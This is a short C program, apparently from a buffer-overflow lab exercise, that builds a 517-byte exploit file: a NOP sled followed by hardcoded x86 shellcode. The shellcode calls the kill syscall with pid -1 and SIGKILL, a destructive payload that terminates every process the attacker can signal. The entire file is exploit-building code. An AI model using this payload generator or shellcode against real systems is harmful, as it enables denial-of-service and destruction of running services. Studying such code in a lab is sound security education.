#include <stdio.h>
#include <string.h>
 
char *shellcode = "\x31\xc0\x50\xb0\x25\xbb\xff\xff\xff\xff\xb1\x09\xcd\x80";

int main(int argc,char *argv[])
{
	 char buffer[517];
 	char buf[strlen(shellcode)+1];
	strcpy(buf,shellcode);

        FILE *badfile;

        /* Initialize buffer with 0x90 (NOP instruction) */
        memset(&buffer, 0x90, 517);
	
	printf("shell code length is %d",strlen(shellcode));

	for(int i=0;i<strlen(shellcode);++i){
	
		//printf("%s",buf[i]);
		buffer[517 - (strlen(shellcode) + 1) + i] = buf[i];
	}
	buffer[517 - 1] = '\0';

	
        badfile = fopen(argv[1], "w");

        fwrite(buffer, 517, 1, badfile);

	fclose(badfile);

	return 0;
}
